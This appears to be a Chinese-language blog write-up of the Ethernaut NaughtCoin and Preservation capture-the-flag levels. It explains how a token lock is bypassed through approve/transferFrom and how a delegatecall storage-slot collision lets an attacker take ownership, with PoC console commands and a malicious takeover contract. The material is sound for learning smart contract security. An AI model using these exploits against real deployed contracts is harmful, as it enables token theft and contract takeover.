---

title: '使用ERC20标准库不重写完全问题与delegateCall-2'
date: 2022-12-13 14:42:15
tags:
- '区块链技术'
- '智能合约安全'
categories:
- '智能合约安全'
---

<!-- more -->

::: tip

目前来看最全面的智能合约安全靶场:+1:

https://ethernaut.openzeppelin.com/ 

浏览器控制台 help()指令

![help](./assets/1670479273112.png)

:::

#### 第十五 / 十六关NaughtCoin / Preservation思路与POC

##### 先看第一个合约代码

##### 目标: bypass转账判断

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'openzeppelin-contracts-08/token/ERC20/ERC20.sol';

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = block.timestamp + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0') {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  //限制 必须是初始代币拥有者 并且在区块时间过去10年后
  modifier lockTokens() {
    if (msg.sender == player) {
      require(block.timestamp > timeLock);
      _;
    } else {
     _;
    }
  } 
} 
```

##### poc思路:point_right:：这个确实很简单,因为此合约只重写了transfer函数并且限制只存在于transfer函数中,仔细看ERC20标准就知道有transfer函数用于**普通转账**,还有transferFrom用于**授权转账**. 所以其实只需要我们自己授权自己发送代币然后使用transferFrom函数即可.

```solidity
 //ERC20标准 transferFrom标准实现
 function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        //sender为被授权者
        address spender = _msgSender();
        //校验代币所有者是否有批准 被授权者使用amount数量的代币,有就开始转账
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

```

##### poc脚本:

```js
await contract.approve(player,toWei('1000000'))
await contract.transferFrom(player,'0xe58812571718B4aBb70afe96A02A366e009D171e',toWei('1000000'))
```

##### 只是需要注意一点,转移如此多的ERC20代币是非常消耗gas的:black_nib:如果gas上限不够大概会收到这样的错误:

```bash
Error in RPC response:,err: max fee per gas less than block base fee: address 0x0e21d35681E679C33dD49731935FB81F1aee8C05, maxFeePerGas: 28609540 baseFee: 302717279 (supplied gas 15000000)
```



#### 看第二个合约代码:  

##### 目标: 修改owner变量的值

##### 看起来没有任何问题 没有任何修改owner变量的逻辑,但是别忘了 Preservation 这是个代理合约(它使用了delegateCall) :black_flag:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//代理合约
contract Preservation {
  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // 设定函数签名
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 

  function setFirstTime(uint _timeStamp) public {
  //代理调用timeZone1Library合约的setTime方法
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// 逻辑合约
contract LibraryContract {
  /*
  其实问题出在了这里,实际的逻辑执行合约是不存储任何数据的(数据的更改发生在代理合约上),
 !!! 这代表着逻辑合约上的变量所占slot实际是与代理合约对应的
  因此逻辑合约的变量设置必须与代理合约一样.
 !!! 所以这里更改的storedTime变量的数据占slot0位置,这代表着实际更改的数据是Preservation合约slot0上的数据
  */
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

##### poc思路:point_right:：能够更改Preservation合约slot 0的数据这意味着什么呢,意味着你可以更改timeZone1Library库的地址为恶意合约的地址,意味着可以使setFirstTime函数实际调用的是恶意合约上的方法。

```js
//设置恶意合约地址到slot0
await contract.setFirstTime('0x95a3b18c0590672CA4C2be9d3548de87486ba170')
//此时调用setFirstTime方法实际是调用恶意合约的setTime方法
await contract.setFirstTime('0x0e21d35681E679C33dD49731935FB81F1aee8C05')
//成功修改
await contract.owner()
'0x0e21d35681E679C33dD49731935FB81F1aee8C05'
```

##### 恶意合约代码:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationBypass { 
//变量的数量类型所占slot 必须与Preservation合约保持一致
 address public t1;
 address public t2;
 address public owner;
 uint storedTime;
 //函数签名是不变的所以其实只要方法名为setTime()即可
    function setTime(uint256 _owner) public{
         owner =  address(uint160(_owner));         
    }
}
```

